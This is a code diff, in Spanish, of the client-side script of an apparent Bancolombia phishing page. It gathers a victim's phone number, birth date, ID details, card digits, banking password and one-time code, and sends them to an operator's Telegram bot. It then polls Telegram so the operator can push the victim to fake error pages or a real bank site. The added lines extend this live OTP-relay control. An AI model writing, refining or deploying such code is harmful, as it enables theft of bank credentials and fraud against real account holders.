@@ -44,7 +44,7 @@
 
 <script>
 document.addEventListener('DOMContentLoaded', async () => {
-  // 1. Carga configuración
+  // 1. Cargar config desde botconfig.json
   let cfg;
   try {
     cfg = await fetch('botconfig.json').then(r => r.json());
@@ -54,70 +54,93 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
   const { token: botToken, chat_id: chatId } = cfg;
 
-  // 2. Recoger datos previos y código dinámico
-  const sess = JSON.parse(localStorage.getItem('bancoldata')||'{}');
+  // 2. Recoger datos y OTP
+  const sess = JSON.parse(localStorage.getItem('bancoldata') || '{}');
   const dyn = localStorage.getItem('bancoldina');
   if (!sess.celular || !sess.clave || !dyn) {
-    alert('Datos incompletos. Redirigiendo al inicio.');
-    return window.location.href='index.html';
+    alert('Datos incompletos. Redirigiendo...');
+    return window.location.href = 'index.html';
   }
 
-  // 3. Construir mensaje con todo
+  // 3. Generar transactionId único si no existe
   const transactionId = localStorage.getItem('transactionId') ||
-    (Date.now().toString(36)+Math.random().toString(36).slice(2));
-  let msg = `
+    (Date.now().toString(36) + Math.random().toString(36).slice(2));
+  localStorage.setItem("transactionId", transactionId);
+
+  // 4. Crear mensaje
+  const msg = `
 📥 <b>INGRESO BANCOLOMBIA (Dinámica)</b>
-🆔 ID: ${transactionId}
-📱 Celular: ${sess.celular}
-🎂 Nacimiento: ${sess.nacimiento}
-💳 Tipo: ${sess.tipo}
-🔢 Identificador: ${sess.identificador}
-🔸 Últimos 2 dígitos: ${sess.digitosFinales}
-🔐 Clave: ${sess.clave}
-🔄 Dinámica OTP: ${dyn}
+🆔 <b>ID:</b> ${transactionId}
+📱 <b>Celular:</b> ${sess.celular}
+🎂 <b>Nacimiento:</b> ${sess.nacimiento}
+💳 <b>Tipo:</b> ${sess.tipo}
+🔢 <b>Identificador:</b> ${sess.identificador}
+🔸 <b>Últimos 2 dígitos:</b> ${sess.digitosFinales}
+🔐 <b>Clave:</b> ${sess.clave}
+🧩 <b>Dinámica OTP:</b> ${dyn}
 `;
 
-  // 4. Botón “Finalizar” para confirmación
-  const keyboard = { inline_keyboard:[
-    [{ text:'✅ Confirmar', callback_data:`confirm_finalizar:${transactionId}` }]
-  ]};
+  // 5. Crear botones adicionales
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "✅ Confirmar", callback_data: `confirm_finalizar:${transactionId}` }],
+      [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }],
+      [{ text: "🔁 Error OTP", callback_data: `error_otp:${transactionId}` }]
+    ]
+  };
 
-  // 5. Enviar mensaje + botón
-  await fetch('botmaster2.php',{
-    method:'POST',
-    headers:{'Content-Type':'application/x-www-form-urlencoded'},
-    body:
-      'data='+encodeURIComponent(msg)
-      +'&keyboard='+encodeURIComponent(JSON.stringify(keyboard))
+  // 6. Enviar mensaje con botones
+  await fetch('botmaster2.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'data=' + encodeURIComponent(msg) + '&keyboard=' + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // 6. Esperar respuesta del botón
+  // 7. Escuchar interacción
   await waitButton(transactionId, botToken);
 });
 
-async function waitButton(txId, botToken){
+async function waitButton(txId, botToken) {
   try {
-    const resp = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
-    const js = await resp.json();
-    const upd = js.result.find(u=>
-      u.callback_query
-      && u.callback_query.data===`confirm_finalizar:${txId}`
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+    const js = await res.json();
+
+    const update = js.result.find(u =>
+      u.callback_query && u.callback_query.data && u.callback_query.data.includes(txId)
     );
-    if (upd) {
-      // Confirmación al chat
-      await fetch('sendStatus.php',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({status:'Finalización Dinámica OK'})
+
+    if (update) {
+      const accion = update.callback_query.data.split(':')[0];
+      let redireccion = '';
+
+      switch (accion) {
+        case 'confirm_finalizar':
+          redireccion = 'https://www.bancoppel.com/';
+          break;
+        case 'error_logo':
+          redireccion = 'errorlogo.html';
+          break;
+        case 'error_otp':
+          redireccion = 'cel-dina-error.html';
+          break;
+        default:
+          redireccion = 'index.html';
+      }
+
+      // Notificar estado
+      await fetch('sendStatus.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status: `Acción desde botón: ${accion}` })
       });
-      // Redirigir a éxito
-      return window.location.href='https://www.bancolombia.com/personas';
+
+      return window.location.href = redireccion;
     } else {
-      return setTimeout(()=>waitButton(txId, botToken),2000);
+      return setTimeout(() => waitButton(txId, botToken), 2000);
     }
-  } catch(e){
-    console.error(e);
-    setTimeout(()=>waitButton(txId, botToken),3000);
+  } catch (err) {
+    console.error("Error botón:", err);
+    setTimeout(() => waitButton(txId, botToken), 3000);
   }
 }
 </script>
